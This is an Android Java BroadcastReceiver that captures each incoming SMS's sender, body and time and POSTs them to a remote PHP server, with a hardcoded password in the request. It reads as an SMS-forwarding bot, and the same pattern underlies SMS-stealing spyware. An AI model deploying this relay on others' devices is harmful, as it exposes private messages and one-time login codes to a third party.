package com.example.smssendingbot;

import static android.content.ContentValues.TAG;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {
    private HashMap<String, String> messageParts = new HashMap<>(); // this is for add large msg

    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        Log.d("smsBroadcast", "onReceive called()");

        try {
            if (bundle != null) {

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                    // get time as millisecond
                        //then format it so that it can be readable
                      long time = smsMessage.getTimestampMillis();
                      String smsTime = DateFormat.getDateTimeInstance().format(new Date(time));


                    Log.d("smsBroadcast", "senderNum: "+sender);
                        Log.d("smsBroadcast", "message: "+messageBody);
                        Log.d("smsBroadcast", "smsTime: "+smsTime);

                        //sending sms to your server
                        SendToServer (context, sender, messageBody, smsTime);

                    }
                }
            }
        } catch (Exception e) {
            Log.e("SmsReceiver", "Error in onReceive", e);
        }
    }



    public void SendToServer(Context context,String sender,String Text,String time){

     String url="https://developernoyon.xyz/SmsBot/UpdateData.php";
        RequestQueue queue= Volley.newRequestQueue(context);

     StringRequest stingReq=new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
         @Override
         public void onResponse(String response) {

             Log.d("SmsBordcast",response);

         }
     }, new Response.ErrorListener() {
         @Override
         public void onErrorResponse(VolleyError error) {
             Log.d("SmsBordcast","Error"+error.toString());

         }
     }) {
         @Override
         protected Map<String, String> getParams() {  // this value pass to the server
             // Prepare parameters to send
             Map<String, String> map = new HashMap<>();
             map.put("senderNum",sender);
             map.put("message",Text);
             map.put("password","20196");
             map.put("time",time);


             return map;
         }
     };



        queue.add(stingReq);


    } //end


    }
